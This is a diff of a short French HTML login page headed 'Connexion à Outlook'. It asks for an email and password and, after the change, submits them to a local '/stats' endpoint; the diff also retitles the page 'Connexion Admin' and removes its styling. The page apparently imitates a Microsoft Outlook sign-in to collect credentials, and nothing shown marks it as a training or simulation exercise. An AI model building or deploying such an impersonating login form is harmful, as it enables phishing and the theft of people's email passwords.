@@ -3,21 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion Outlook</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
-        form { display: inline-block; padding: 20px; border: 1px solid #ddd; box-shadow: 2px 2px 10px #aaa; }
-        input { display: block; margin: 10px 0; padding: 8px; width: 250px; }
-        button { background-color: blue; color: white; padding: 10px; border: none; cursor: pointer; }
-    </style>
+    <title>Connexion Admin</title>
 </head>
 <body>
     <h2>Connexion à Outlook</h2>
-    <form action="/submit" method="POST">
-        <label>Email :</label>
-        <input type="email" name="email" required><br>
-        <label>Mot de passe :</label>
-        <input type="password" name="password" required><br>
+    <form method="POST" action="/stats">
+        <label for="username">Email :</label>
+        <input type="text" id="username" name="username" required><br><br>
+        
+        <label for="password">Mot de passe :</label>
+        <input type="password" id="password" name="password" required><br><br>
+        
         <button type="submit">Se connecter</button>
     </form>
 </body>
